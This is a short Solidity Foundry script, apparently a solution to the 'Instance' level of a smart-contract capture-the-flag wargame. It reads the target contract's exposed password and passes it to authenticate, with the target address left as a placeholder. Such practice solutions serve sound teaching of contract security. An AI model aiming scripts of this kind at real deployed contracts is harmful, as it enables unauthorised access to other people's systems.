// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/levels/Instance/Instance.sol";
import "forge-std/Script.sol";

contract InstanceAttackScript is Script {
    function setUp() public {}

    function run() public {
        Instance target = Instance(payable(0x0000000000000000000000000000000000000000)); // Insert instance target address

        vm.startBroadcast();

        string memory pw = target.password();
        target.authenticate(pw);

        vm.stopBroadcast();
    }
}
